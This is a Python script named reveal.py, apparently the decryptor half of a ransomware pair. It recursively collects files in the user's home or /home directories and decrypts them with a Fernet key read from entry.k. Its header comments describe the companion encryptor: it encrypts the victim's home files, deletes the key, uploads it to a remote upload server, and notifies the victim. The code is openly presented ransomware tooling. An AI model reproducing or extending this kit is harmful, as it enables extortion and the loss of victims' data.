# Revelation
# It recusively gathers all of the files in the user's home dir (or users' /home dir with Linux) and stores in f.
# In 20 seconds or so the entry.k (key) was deleted in 3rawm05nar.py. User was notified via text file.
# Note: entry.k retrieval is crucial and it's the key used in this script to decrypt files.
# If entry.k is lost, files may not be recoverable. Use at own risk :)
# Recovery - Copy and paste the contents from entry.k to the victim machine labelled entry.k.
# The entry.k file can be recovered from the python3 uploadserver that it was uploaded to in 3rawm05nar.py.
# Run reveal.py in same directory as entry.k. Start the decryption process.

#!/usr/bin/env python3

# Import modules
import platform, sys, os
from cryptography.fernet import Fernet

# Decrypt the data
def payformance(thek):
    # Try, but catch the errors
	for x in f:
		try:
			with open(x, "rb") as d:
				info = d.read()
			info_dcry = Fernet(thek).decrypt(info)
			with open(x, "wb") as thex:
				thex.write(info_dcry)
	
		except PermissionError:
			continue
		except FileNotFoundError:
			continue
		except:
			continue

# Recursively gather all files in the users' /home dir and store in f.
def payformL():
    # Users' /home dir start finding files
    for (subdir, dirs, files) in os.walk('/home'):
        for x in files:

        # Very important! "DO NOT ENCRYPT THESE BELOW FILES" or it will end poorly.

            if x == '3rawm05nar.py' or x == 'entry.k' or x \
                == 'reveal.py':
                continue
            y = os.path.join(subdir, x)
            if os.path.isfile(y):
                f.append(y)

        # If ran from the commandline window, it will display message here as well as files to be changed. 

    print('')
    print(stmt)
    print('')
    print(f)
    access()
    
# Recursively gather all files in the user's home dir and store in f.

def payformW():

    dir = os.path.expanduser('~')

    # User's home dir start finding files
    for (subdir, dirs, files) in os.walk(dir):
        for x in files:

        # Very important! "DO NOT ENCRYPT THESE BELOW FILES" or it will end poorly.

            if x == '3rawm05nar.py' or x == 'entry.k' or x \
                == 'reveal.py':
                continue
            y = os.path.join(subdir, x)
            if os.path.isfile(y):
                f.append(y)

    # If ran from the commandline window, it will display message here as well as files to be changed. 

    print('')
    print(stmt)
    print('')
    print(f)
    access()
# Distinguish between Linux and Windows - did this because they recurse files differently
def payform():

    if platform.system() == 'Linux':
        payformL()
    elif platform.system() == 'Windows':
        payformW()

# Global variables
f = []
stmt = "'Decryption is under Way!'"
# Read the key
def access():

	with open("entry.k", "rb") as k:
		rev3al = k.read()
	payformance(rev3al)

# Bring the Main
if __name__ == "__main__":

	payform() 